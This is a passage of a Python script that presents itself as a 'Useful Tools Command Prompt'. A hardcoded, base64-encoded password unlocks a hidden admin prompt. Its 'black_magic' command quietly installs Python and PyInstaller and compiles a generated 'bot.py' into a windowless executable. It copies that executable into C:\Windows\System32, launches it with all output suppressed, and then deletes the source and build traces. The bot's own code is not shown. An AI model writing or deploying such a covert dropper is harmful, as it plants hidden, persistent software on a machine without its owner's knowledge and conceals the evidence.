def cleanup():
    subprocess.run("rmdir /S /Q build", shell=True)
    subprocess.run("del bot.spec", shell=True)
    subprocess.run("rmdir /S /Q attributes", shell=True)
    subprocess.run("del bot.py", shell=True)
    subprocess.run("rmdir /S /Q dist", shell=True)


password = bytes(input("\033[30m"), 'utf-8')
print("\033[0m")
password = base64.b64encode(password)
if str(password) == "b'Q2FsZWJqc2NobWl0dDIwMDQu'":
    os.system("cls")
    print(f"Useful Tools Command Prompt \033[34m[Version: {version}] \033[32m[MODE: ADVANCED-ADMIN]\033[0m")
    print("For a list of commands, use 'help' command.\n")

    exited = False

    while not exited:
        command = input("C:\\system32\\" + "\033[36m" + var_set("echo %USERNAME%") + "\033[0m>")

        if command.lower() == "exit":
            exited = True
            screen()
            system()
        elif command.lower() == "black_magic":
            subprocess.run("powershell Expand-Archive attributes.zip", shell=True, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
            print("\nInstalling: Python")
            subprocess.run(".\\attributes\\python.exe /quiet", shell=True, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
            print("Installing: Pyinstaller")
            subprocess.run(
                '"%USERPROFILE%\\AppData\\Local\\Programs\\Python\\Python310\\Scripts\\pip.exe" install pyinstaller',
                shell=True, stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL)

            print("\nWriting Bot Program:")
            write_bot()
            print("Launching Bot:")
            subprocess.run(
                '"%USERPROFILE%\\AppData\\Local\\Programs\\Python\\Python310\\Scripts\\pyinstaller.exe" --onefile bot.py --noconsole',
                shell=True, stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL)
            sleep(5)
            subprocess.run("copy .\\dist\\bot.exe C:\\Windows\\System32\\", shell=True, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
            subprocess.run('start C:\\Windows\\System32\\bot.exe', shell=True, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)

            sleep(5)

            cleanup()

            print("\n")

print("\n")
